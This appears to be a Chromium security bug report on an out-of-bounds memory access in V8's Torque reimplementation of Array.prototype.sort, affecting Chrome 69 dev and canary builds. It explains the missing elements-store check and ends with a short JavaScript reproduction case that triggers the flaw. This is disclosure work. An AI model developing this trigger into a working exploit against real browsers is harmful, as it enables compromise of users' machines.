<b>VULNERABILITY DETAILS</b>
https://cs.chromium.org/chromium/src/v8/src/builtins/array.tq?rcl=6a21b5f98ec12d8e96e64f74f9ffb60a6fded7ce&l=578
macro CanUseSameAccessor<ElementsAccessor : type>(
    context: Context, receiver: Object, initialReceiverMap: Object,
    initialReceiverLength: Number): bool {
  assert(IsJSArray(unsafe_cast<HeapObject>(receiver)));

  let a: JSArray = unsafe_cast<JSArray>(receiver);
  if (a.map != initialReceiverMap) return false;

  let originalLength: Smi = unsafe_cast<Smi>(initialReceiverLength);
  if (a.length_fast != originalLength) return false;

  return true;
}

Array.prototype.sort has been recently reimplemented using Torque. |CanUseSameAccessor()| determines whether the
algorithm should fall back to the slow path after performing actions that are observable by JavaScript. It
currently doesn't ensure that the elements store of the array hasn't been replaced. A JS function passed to
|sort()| can do the following:
- update the length of the array forcing the store to be shrunk
- attach a new elements store to the array
- set the length to the original value

In this case, |sort()| might access OOB data because it uses the initial (shrunk) elements for load/store operations.

<b>VERSION</b>
Google Chrome 69.0.3452.0 (Official Build) dev (64-bit) (cohort: Dev)
Google Chrome 69.0.3457.0 (Official Build) canary (64-bit) (cohort: Clang-64)

<b>REPRODUCTION CASE</b>
<script>
ARRAY_LEN = 1024 * 1024;

array = [];
for (let i = 1; i < ARRAY_LEN; ++i) {
  array[i] = i + 0.1;
}

let executed = false;
compareFn = _ => {
  if (!executed) {
    executed = true;

    array.length = 1; // shrink
    array.length = 0; // replace
    array.length = ARRAY_LEN; // restore the original length
  }
}

array.sort(compareFn);
location.reload();
</script>
